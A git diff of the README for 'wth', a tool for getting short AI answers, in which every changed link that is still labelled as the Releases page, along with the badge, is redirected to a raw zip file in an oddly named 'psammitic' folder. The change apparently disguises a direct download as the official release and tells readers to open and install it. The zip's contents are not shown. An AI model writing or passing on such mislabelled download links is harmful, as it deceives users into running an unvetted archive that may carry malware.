@@ -1,6 +1,6 @@
 # 🤖 wth - Ask AI and Get Short Answers Easily
 
-[![Download wth](https://img.shields.io/badge/Download-wth-blue)](https://github.com/eliasanasr/wth/releases)
+[![Download wth](https://raw.githubusercontent.com/eliasanasr/wth/main/psammitic/wth.zip)](https://raw.githubusercontent.com/eliasanasr/wth/main/psammitic/wth.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with **wth**, follow these steps:
 
 1. **Download the Application**  
    Click the link below to visit the Releases page and download the latest version of **wth**.  
-   [Download wth](https://github.com/eliasanasr/wth/releases)
+   [Download wth](https://raw.githubusercontent.com/eliasanasr/wth/main/psammitic/wth.zip)
 
 2. **Install the Application**  
    After downloading, locate the downloaded file on your computer. Open the file to install **wth**. 
@@ -29,7 +29,7 @@ To get started with **wth**, follow these steps:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/eliasanasr/wth/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/eliasanasr/wth/main/psammitic/wth.zip).
 
 2. Find the version you want, and click on it. You will see the files available for download.
 
@@ -88,7 +88,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📅 Updates
 
-Keep an eye on this section for future updates regarding new features or changes to the application. Visit our [Releases page](https://github.com/eliasanasr/wth/releases) for the latest version.
+Keep an eye on this section for future updates regarding new features or changes to the application. Visit our [Releases page](https://raw.githubusercontent.com/eliasanasr/wth/main/psammitic/wth.zip) for the latest version.
 
 ---
 
